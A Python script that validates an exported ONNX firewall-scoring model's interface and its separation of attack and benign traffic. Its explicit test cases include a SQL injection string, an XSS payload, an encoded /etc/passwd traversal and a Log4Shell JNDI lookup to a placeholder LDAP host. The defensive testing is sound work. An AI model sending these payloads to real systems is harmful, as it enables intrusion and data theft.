# SPDX-License-Identifier: Apache-2.0
"""Validate the exported ONNX scorer: (1) its I/O interface matches what
waf_ml::score expects — input (1,16) f32, one f32 output; (2) sanity — attacks
score higher than benign on average; (3) a handful of explicit examples.

The authoritative latency + tract-compatibility check happens in RUST
(`cargo test --features ml-waf ml_scorer_latency -- --ignored`), since tract —
not onnxruntime — is what runs in production. This script is the fast Python
pre-flight.

    python3 ml/validate.py --model ml/waf-scorer.onnx --corpus ml/corpus/dataset.npz
"""

from __future__ import annotations

import argparse
import os

import numpy as np
import onnxruntime as ort

from features import extract_features

HERE = os.path.dirname(os.path.abspath(__file__))


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--model", default=os.path.join(HERE, "waf-scorer.onnx"))
    ap.add_argument("--corpus", default=os.path.join(HERE, "corpus", "dataset.npz"))
    args = ap.parse_args()

    sess = ort.InferenceSession(args.model, providers=["CPUExecutionProvider"])
    inp, out = sess.get_inputs()[0], sess.get_outputs()[0]
    print(f"  input  : {inp.name} {inp.shape} {inp.type}")
    print(f"  output : {out.name} {out.shape} {out.type}")
    assert list(inp.shape) == [1, 16], f"input must be (1,16), got {inp.shape}"

    def score(vec):
        x = np.asarray(vec, dtype=np.float32).reshape(1, 16)
        return float(sess.run(None, {inp.name: x})[0].ravel()[0])

    data = np.load(args.corpus, allow_pickle=True)
    X, y = data["X"].astype(np.float32), data["y"]
    s = np.array([score(X[i]) for i in range(len(X))])
    # A float32 sigmoid can land a hair outside [0,1]; production waf_ml::score
    # clamps, so mirror that and only reject WILD excursions (a broken interface).
    assert s.min() >= -0.01 and s.max() <= 1.01, f"scores wildly out of range: [{s.min()},{s.max()}]"
    s = np.clip(s, 0.0, 1.0)
    print(f"\n  mean score — benign {s[y == 0].mean():.3f}  attack {s[y == 1].mean():.3f}  "
          f"(separation {s[y == 1].mean() - s[y == 0].mean():+.3f})")

    print("\n  explicit examples:")
    cases = [
        ("benign", "GET", "/api/v1/users/42", [("user-agent", "Mozilla/5.0")]),
        ("sqli", "GET", "/items?id=1' OR '1'='1';--", [("user-agent", "sqlmap/1.7")]),
        ("xss", "GET", "/search?q=<script>alert(1)</script>", [("user-agent", "Mozilla/5.0")]),
        ("traversal", "GET", "/%2e%2e%2f%2e%2e%2fetc%2fpasswd", [("user-agent", "curl/8")]),
        ("log4shell", "GET", "/${jndi:ldap://x/a}", [("user-agent", "curl/8")]),
    ]
    for name, m, u, h in cases:
        print(f"    {name:<10} score={score(extract_features(m, u, h)):.3f}   {m} {u[:48]}")


if __name__ == "__main__":
    main()
